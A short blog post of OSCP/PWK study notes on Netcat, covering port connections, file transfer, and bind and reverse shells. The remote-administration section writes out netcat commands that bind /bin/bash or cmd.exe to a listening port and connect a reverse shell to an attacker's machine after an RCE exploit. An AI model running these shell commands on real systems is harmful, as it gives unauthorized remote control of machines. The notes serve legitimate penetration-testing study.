---
title: "Fun with Netcat"
date: 2022-02-21
---

PWK Chapter 4 is all about Netcat. The 4 sections are:

- 4.1.1 Connecting to a TCP/UDP Port
- 4.1.2 Listening on a TCP/UDP Port
- 4.1.3 Transferring Files with Netcat
- 4.1.4 Remote Administration with Netcat

Lets say you have a remote server, 192.168.10.25 and a service listening on port 4444. To connect to that port, you would run `nc 192.168.10.25` 4444 which opens a raw socket connections to the remote host. Most services have protocols to connect to them, so this isn't normally useful for actual services, but it can be a very powerful tool.  
  
For instance, lets say you are actually on the remote server, you could use netcat to open up a listener with `nc -l -p 4444`  
  
You could just connect to the port with the command above, but that's not typically all that useful. If you wanted to transfer a file, you would specify the filename on the listening host `nc -l -v 4444 outfile.txt` and then send the file with `nc 192.168.10.25 4444 < infile.txt`

## Remote administration

One other thing you can do with netcat is configure a bind or reverse shell. in a bind shell, you set up a listener on the target machine, and connect from the attacking machine. For OSCP and other pentesting reasons, you are most often going to utilize a reverse shell when trying to gain a foothold, with bind shells only really being used inside the network or on public facing hosts. To initiate a bind shell, from the target machine you set up a listener pointed to the shell of that system.

```

# Windows
nc -lvnp 4444 -e /cmd.exe
# Unix
nc -lvnp 4444 -e /bin/bash
```

You can then connect to it from the attacking machine:

```
nc $TARGET_IP 4444
```

For a reverse shell, you set up a listener on the attacking machine. This is pretty common as in most cases you are not going to be able to open a listening port (especially without being noticed) on a target machine, but it's much more difficult to block outgoing traffic. On the attacking machine:

```
# On the attacking machine:
nc -lvnp 4444
# On the target machine, through
# some sort of RCE exploit:
nc $ATTACKING_MachineIP 4444 -e /bin/bash
```

## Conclusion

I think I covered the bases of what the course syllabus outlines, although there are a lot of other features of netcat. Don't foget to check out the gitlab repo, it's pretty sparse as I just started, but it'll get filled out with tools as I move through the PWK material and do labs/CTF's.  
  
[OSCP self study gitlab repository](https://gitlab.com/jhax/oscp-self-study)
